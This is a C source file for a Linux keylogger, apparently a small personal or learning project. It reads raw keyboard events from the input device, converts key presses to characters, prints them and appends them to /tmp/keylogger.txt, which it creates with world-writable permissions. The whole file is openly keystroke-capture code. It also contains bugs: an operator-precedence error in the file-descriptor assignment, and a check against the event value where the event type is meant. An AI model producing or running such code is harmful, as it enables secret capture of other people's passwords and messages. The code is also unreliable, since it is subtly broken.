#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdbool.h>

#include "device-reader.h"
#include "input-event-codes.h"

int main()
{

    char buf[30] = "";
    int fdKeyboard = -1;
    int fdStorage = -1;
    ssize_t len = 0;
    struct input_event ie = {};
    int i = 0;


    get_keyboard_event(buf, 30);


    if ((fdKeyboard = open(buf, O_RDONLY)) == -1) {
        fprintf(stderr, "Unable to open keyboard event file at %s", buf);
        exit(EXIT_FAILURE);
    }
    FILE *pFile2 = fopen("/tmp/keylogger.txt", "a");

    if (fdStorage = open("/tmp/keylogger.txt",
        O_WRONLY | O_APPEND,
        S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH
    ) == -1) {
        fprintf(stderr, "Unable to create /tmp/keylogger.txt file");
        close(fdKeyboard);
        exit(EXIT_FAILURE);
    }

    printf("fdStorage = %d, fdKeyboard = %d\n", fdStorage, fdKeyboard);
    fflush(stdout);
    for (i = 0;; ++i) {
        len = read(fdKeyboard, &ie, sizeof(ie));
        if (ie.value == EV_KEY) {
            char tmp = input_event_to_ascii(ie);
            if (tmp != '-') {
                printf("Found key pressed: %c\n", tmp); fflush(stdout);
                // fprintf(pFile2, "%c", tmp);
                // fflush(pFile2);
                char bufTmp[1] = {tmp};
                write(fdStorage, bufTmp, 1);
                fsync(fdStorage);
            }
        }
    }

    return EXIT_SUCCESS;
}
